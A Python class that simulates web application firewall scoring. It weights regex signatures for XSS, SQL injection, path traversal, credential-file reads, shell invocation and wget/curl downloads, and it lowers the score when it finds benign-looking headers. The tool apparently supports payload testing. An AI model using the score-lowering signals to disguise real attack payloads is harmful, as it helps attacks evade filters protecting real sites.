class DetectionSimulator:
    """
    Simulates ML-based WAF detection scoring.
    
    In production, this would be replaced with:
    - Actual WAF response analysis
    - Local LLM-based classification
    - Ensemble model scoring
    """

    # Patterns that trigger detection (weighted)
    MALICIOUS_PATTERNS = {
        r"<script.*?>": 0.8,
        r"javascript:": 0.7,
        r"onerror\s*=": 0.7,
        r"onload\s*=": 0.6,
        r"alert\s*\(": 0.6,
        r"eval\s*\(": 0.7,
        r"document\.cookie": 0.5,
        r"SELECT.*FROM": 0.6,
        r"UNION.*SELECT": 0.8,
        r"OR\s+1\s*=\s*1": 0.7,
        r"DROP\s+TABLE": 0.9,
        r"\.\.\/\.\.\/": 0.7,
        r"\/etc\/passwd": 0.8,
        r"cmd\.exe": 0.7,
        r"\/bin\/bash": 0.6,
        r"wget\s+http": 0.5,
        r"curl\s+http": 0.5,
        r"<\?php": 0.5,
        r"system\s*\(": 0.6,
        r"exec\s*\(": 0.6,
        r"passthru\s*\(": 0.7,
    }

    # Patterns that reduce detection score (benign signals)
    BENIGN_PATTERNS = {
        r"Authorization:\s*Bearer": -0.3,
        r"AWS4-HMAC-SHA256": -0.4,
        r"swagger": -0.2,
        r"openapi": -0.2,
        r"Content-Security-Policy": -0.3,
        r"Strict-Transport-Security": -0.2,
        r"jQuery\s+v\d": -0.2,
        r"application\/json": -0.1,
        r"text\/html;\s*charset": -0.1,
        r"<!--\s*saved\s+from": -0.25,
    }

    @classmethod
    def score_payload(cls, content: str) -> float:
        """
        Calculate a detection score for a payload.
        
        Returns:
            Score from 0.0 (completely benign) to 1.0 (highly malicious)
        """
        score = 0.0
        content_lower = content.lower()

        # Check malicious patterns
        for pattern, weight in cls.MALICIOUS_PATTERNS.items():
            if re.search(pattern, content, re.IGNORECASE):
                score += weight

        # Adjust for benign patterns
        for pattern, weight in cls.BENIGN_PATTERNS.items():
            if re.search(pattern, content, re.IGNORECASE):
                score += weight  # Negative weight reduces score

        # Analyze entropy (high entropy often signals obfuscation)
        entropy = cls._calculate_entropy(content)
        if entropy > 5.5:
            score += 0.2
        elif entropy < 3.5:
            score -= 0.1

        # Penalize for length (very long payloads are suspicious)
        if len(content) > 1000:
            score += 0.15
        elif len(content) < 10:
            score += 0.1

        # Cap between 0 and 1
        return max(0.0, min(1.0, score))

    @classmethod
    def _calculate_entropy(cls, data: str) -> float:
        """Calculate Shannon entropy of string."""
        import math
        from collections import Counter
        
        if not data:
            return 0.0
        length = len(data)
        counter = Counter(data)
        return -sum((count / length) * math.log2(count / length) 
                   for count in counter.values())


